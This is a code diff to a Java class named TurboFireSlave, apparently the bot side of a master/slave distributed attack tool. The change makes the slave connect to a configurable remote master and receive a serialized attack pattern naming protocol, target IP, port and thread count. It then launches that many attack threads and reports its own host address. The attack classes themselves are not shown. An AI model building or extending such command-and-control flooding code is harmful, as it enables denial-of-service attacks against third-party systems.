@@ -19,6 +19,7 @@ package app;
 import view.GUI;
 import utilies.AttackPattern;
 import utilies.AttackFactory;
+import utilies.SlaveResponse;
 import protocols.interfaces.Protocol;
 import java.io.PrintWriter;
 import java.io.InputStreamReader;
@@ -27,6 +28,7 @@ import java.io.BufferedReader;
 import java.io.ObjectInputStream;
 import java.io.Serializable;
 import java.net.Socket;
+import java.net.Inet4Address;
 
 /**
  * @author Lucas Fonseca dos Santos
@@ -57,13 +59,19 @@ public class TurboFireSlave implements Serializable {
      */
     private AttackPattern attackPattern;
 
+    private String masterAddress;
+
+    private int masterPort;
+
     /**
      * The turbo fire slave version executable
      * constructor. It sets the gui instance and
      * start slave operation.
      */
-    public TurboFireSlave() {
+    public TurboFireSlave(String masterAddress, int masterPort) {
         this.gui = new GUI();
+        this.masterAddress = masterAddress;
+        this.masterPort = masterPort;
         startSlave();
     }
 
@@ -75,14 +83,15 @@ public class TurboFireSlave implements Serializable {
         while(true) {
             try {
                 System.out.println("I'M ONLINE");
-                Socket socket = new Socket("127.0.0.1", 2525);
+                Socket socket = new Socket(this.masterAddress, this.masterPort);
                 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                 this.attackPattern = (AttackPattern) ois.readObject();
+                
                 System.out.println(this.attackPattern.getProtocol() + " - " + this.attackPattern.getIP() + " - " + this.attackPattern.getPort() + " - " + this.attackPattern.getThreadAmount());
                 ois.close();
-
+                this.attackPattern.setAdditionalInformation(Inet4Address.getLocalHost().getHostAddress().toString());
                 for(int i = 0 ; i < this.attackPattern.getThreadAmount() ; i++) {
-                    Thread t = new Thread(AttackFactory.createAttack(this.attackPattern));
+                    Thread t = new Thread(AttackFactory.createAttack(this.attackPattern, this.masterAddress, 2525));
                     t.start();
                     System.out.println("ok");
                 }
